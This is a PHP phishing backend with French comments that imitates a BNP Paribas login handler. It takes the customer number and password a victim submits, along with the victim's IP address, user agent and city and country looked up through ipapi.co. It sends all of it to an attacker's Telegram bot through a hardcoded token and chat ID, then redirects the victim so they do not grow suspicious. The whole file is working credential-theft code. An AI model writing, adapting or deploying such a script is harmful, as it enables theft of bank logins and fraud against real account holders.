<?php
// 1. Récupérer les données du formulaire
$login = $_POST['login'] ?? '';
$motdepasse = $_POST['motdepasse'] ?? '';
$bank = $_POST['bank'] ?? 'BNP PARISBAS';

// 2. Récupérer l'IP et les infos du client
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// 3. Géolocalisation approximative (via ipapi.co)
$geoInfo = json_decode(file_get_contents("https://ipapi.co/{$ip}/json/"), true);

// 4. Construire le message Telegram (identique au format JS)
$message = "
🏦 NOUVELLE CONNEXION {$bank}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 DONNÉES DE CONNEXION:
👤 Numéro Client: {$login}
🔑 Mot de Passe: {$motdepasse}

📍 GÉOLOCALISATION:
🌍 IP: {$ip}
🏙️ Ville: " . ($geoInfo['city'] ?? 'Inconnue') . "
📌 Pays: " . ($geoInfo['country_name'] ?? 'Inconnu') . "

💻 INFOS APPAREIL:
🖥️ User-Agent: {$userAgent}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
";

// 5. Envoyer à l'API Telegram
$telegramToken = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$telegramChatId = "7796457959";

$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
$data = [
    'chat_id' => $telegramChatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

// Requête HTTP POST
$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    ]
];
$context = stream_context_create($options);
file_get_contents($url, false, $context);

// 6. Rediriger l'utilisateur (pour éviter les suspicions)
header("Location: ../final.php");
exit;
?>